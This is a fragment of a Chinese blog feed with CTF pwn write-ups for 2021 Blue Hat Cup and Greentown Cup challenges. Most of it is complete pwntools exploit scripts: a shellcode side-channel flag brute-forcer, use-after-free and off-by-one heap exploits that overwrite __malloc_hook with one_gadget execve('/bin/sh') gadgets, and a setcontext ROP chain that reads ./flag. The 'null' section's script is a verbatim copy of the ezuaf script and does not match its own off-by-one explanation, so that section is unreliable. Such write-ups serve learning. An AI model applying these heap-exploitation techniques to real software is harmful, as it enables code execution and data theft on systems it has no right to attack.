alt="image-20211002193705578"></p><p>mmap申请到的内存位于0x10000~0x11000</p><p>因为会读取我们输入的数据放置到0x10000上，并且会进行调用执行，所以就是读取flag，但是因为没有write函数可以执行，那就进行单个字节的对比爆，即读取flag到一块内存区域，随后单字节爆破，在shellcode中设置loop循环，一旦cmp命中就让程序卡死，否则执行后面的exit因为沙箱禁用程序崩溃退出，根据程序的表现可以区分是否命中，注意因为服务器通信不稳定，每次读到一段flag就更新exp中的flag字符串继续向后爆破</p><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211003084329468.png" alt="image-20211003084329468"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">dis,char</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Welcome to silent execution-box.\n&quot;</span>)<br>    sc = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            mov r12,0x67616c66</span><br><span class="hljs-string">            push r12</span><br><span class="hljs-string">            mov rdi,rsp</span><br><span class="hljs-string">            xor esi,esi</span><br><span class="hljs-string">            xor edx,edx</span><br><span class="hljs-string">            mov al,2</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov rdi,rax</span><br><span class="hljs-string">            mov rsi,0x10700</span><br><span class="hljs-string">            mov dl,0x40</span><br><span class="hljs-string">            xor rax,rax</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov dl, byte ptr [rsi+&#123;&#125;]</span><br><span class="hljs-string">            mov cl, &#123;&#125;</span><br><span class="hljs-string">            cmp cl,dl</span><br><span class="hljs-string">            jz loop</span><br><span class="hljs-string">            mov al,60</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            loop:</span><br><span class="hljs-string">            jmp loop</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(dis,char))<br>    p.send(sc)<br>flag = <span class="hljs-string">&quot;flag&#123;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">35</span>):<br>    sleep(<span class="hljs-number">1</span>)<br>    log.success(<span class="hljs-string">&quot;flag : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>,<span class="hljs-number">0x80</span>):<br>        p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            exp(i,j)<br>            p.recvline(timeout=<span class="hljs-number">1</span>)<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            p.send(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            log.success(<span class="hljs-string">&quot;&#123;&#125; pos : &#123;&#125; success&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">chr</span>(j)))<br>            p.close()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:           <br>            p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前还是个菜鸡，只把题目收集了，现在。。。还是菜鸡，但感觉鸡腿🍖可能大了点，来复现一下蓝帽杯的题目，持续更新吧，目前应该能更新到半决赛，为</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2021绿城杯</title>
    <link href="http://example.com/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/</id>
    <published>2021-10-01T00:54:57.000Z</published>
    <updated>2021-10-13T08:01:25.087Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次PWN题对我这种pwn👶可算是友好至极阿，感受一下大佬在比赛中的杀穿的快感！不过还是不要被这些假象迷了眼，其实还是个蹒跚学步的pwn👶，继续加油！</p><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20211001115859860.png" alt="image-20211001115859860"></p><h2 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173017054.png" alt="image-20210929173017054"></p><p>如题名字，存在UAF，借着UAF泄露libc地址，然后直接修改释放fastchunk的fd指针指向malloc_hook，劫持为one_gadget即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173224666.png" alt="image-20210929173224666"></p><p>在申请功能里面的输入点存在很明显的offbyone，通过offbyone制造overlap，可以泄露出libc，然后修改被重叠的fastchunk的fd指针指向malloc_hook，劫持为one_gadget即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="GreentownNote"><a href="#GreentownNote" class="headerlink" title="GreentownNote"></a>GreentownNote</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929172949043.png" alt="image-20210929172949043"></p><p>程序存在UAF，借着UAF把堆块劫持到tcache上，获得libc，同时修改tcache结构，获得任意地址写</p><p>因为开了沙箱，所以堆上布置rop链进行orw</p><p>最后释放堆块触发setcontext去执行到rop</p><p>嘿嘿，经过一段时间的学习，总算掌握了这种在堆上布置rop链的手法了，该去学习新的知识了！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./GreentownNote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>, <span class="hljs-number">52301</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt; Note size :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;&gt; Content :&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;| Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x260</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>add(<span class="hljs-number">0xf8</span>,p64(heap_base + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base) <br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + libc_base<br>pop_rdx = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>))) + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000000000008aa</span> + libc_base<br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>flag_addr = heap_base + <span class="hljs-number">0x260</span><br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br><br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">17</span> + p64(free_hook) + p64(heap_base + <span class="hljs-number">0x1000</span>) + p64(heap_base + <span class="hljs-number">0x10c0</span>))<br>add(<span class="hljs-number">0xa0</span>,p64(setcontext))<br>add(<span class="hljs-number">0xb8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">20</span> + p64(heap_base + <span class="hljs-number">0x10c0</span>) + p64(ret)) <br>add(<span class="hljs-number">0xc8</span>,rop)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次PWN题对我这种pwn👶可算是友好至极阿，感受一下大佬在比赛中的杀穿的快感！不过还是不要被这些假象迷了眼，其实还是个蹒跚学步的pwn�</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2021九月DASCTF</title>
    <link href="http://example.com/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/"/>
    <id>http://example.com/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/</id>
    <published>2021-09-28T06:48:08.000Z</published>
    <updated>2021-10-13T08:01:25.040Z</updated>
    
